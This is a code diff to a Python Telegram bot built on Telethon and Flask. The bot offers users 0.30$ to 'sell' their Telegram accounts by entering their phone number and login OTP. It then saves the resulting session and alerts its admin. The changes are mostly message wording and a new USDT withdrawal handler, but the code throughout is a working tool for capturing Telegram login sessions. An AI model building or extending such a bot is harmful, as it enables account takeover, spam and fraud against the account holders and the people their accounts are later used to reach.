@@ -1,5 +1,5 @@
 import os
-import asyncio  # এটি এখন ঠিকভাবে ইমপোর্ট করা হয়েছে
+import asyncio # এই লাইনটি আগে মিসিং ছিল
 from flask import Flask
 from threading import Thread
 from telethon import TelegramClient, events, Button
@@ -19,17 +19,16 @@ if not os.path.exists(SESSIONS_DIR):
 
 user_data = {}
 
-# Flask Server
+# Flask Server (Render-এর জন্য)
 app = Flask(__name__)
 @app.route('/')
-def home(): return "Bot is Online"
+def home(): return "Bot is Online and Ready"
 
 def run_flask():
     port = int(os.environ.get("PORT", 8080))
     app.run(host='0.0.0.0', port=port)
 
 # ============ BOT CLIENT INITIALIZATION ============
-# নতুন ইভেন্ট লুপ সেটআপ
 loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
 bot = TelegramClient('bot_session', API_ID, API_HASH, loop=loop).start(bot_token=BOT_TOKEN)
@@ -83,7 +82,7 @@ async def sell_account_init(event):
             await temp_client.connect()
             
             send_code = await temp_client.send_code_request(phone)
-            await conv.send_message("🔢 **Enter the OTP code you received:**")
+            await conv.send_message("🔢 **Enter the 5-digit OTP code you received:**")
             otp_msg = await conv.get_response()
             otp = otp_msg.text.strip()
             
@@ -92,12 +91,12 @@ async def sell_account_init(event):
             if user_id not in user_data: user_data[user_id] = {'balance': 0.0}
             user_data[user_id]['balance'] += 0.30
             
-            await conv.send_message(f"✅ **Success!**\n💰 0.30$ added. Balance: `{user_data[user_id]['balance']:.2f}$`")
-            await bot.send_message(ADMIN_ID, f"🚀 New Session: `{phone}`")
+            await conv.send_message(f"✅ **Success!**\n💰 0.30$ added. Current Balance: `{user_data[user_id]['balance']:.2f}$`")
+            await bot.send_message(ADMIN_ID, f"🚀 **New Account Linked!**\nPhone: `{phone}`")
             await temp_client.disconnect()
             
         except Exception as e:
-            await conv.send_message(f"❌ Error: {str(e)}")
+            await conv.send_message(f"❌ **Error:** {str(e)}")
 
 # ============ CALLBACK HANDLERS ============
 @bot.on(events.CallbackQuery)
@@ -107,11 +106,16 @@ async def callback_handler(event):
 
     if event.data == b"acc_info":
         bal = user_data[user_id]['balance']
-        await event.edit(f"👤 **Account Info**\n\nBalance: `{bal:.2f}$`", buttons=[Button.inline("⬅️ Back", b"main_menu")])
+        await event.edit(f"👤 **Account Info**\n\nUser ID: `{user_id}`\nBalance: `{bal:.2f}$` USDT", buttons=[Button.inline("⬅️ Back", b"main_menu")])
     elif event.data == b"about":
-        await event.edit("ℹ️ Bot Created By: @ToxicNexo", buttons=[Button.inline("⬅️ Back", b"main_menu")])
+        await event.edit("ℹ️ **About Bot**\nCreated By: @ToxicNexo", buttons=[Button.inline("⬅️ Back", b"main_menu")])
     elif event.data == b"main_menu":
         await send_main_menu(event)
+    elif event.data == b"withdraw":
+        if user_data[user_id]['balance'] < 1.0:
+            await event.answer("❌ Minimum withdrawal is 1$", alert=True)
+        else:
+            await event.respond("💳 Send your USDT (BEP20) address:")
 
 # Admin Panel
 @bot.on(events.NewMessage(pattern='/adminpanel'))
@@ -125,4 +129,4 @@ async def admin_panel(event):
 if __name__ == '__main__':
     Thread(target=run_flask).start()
     bot.run_until_disconnected()
-                  
+        
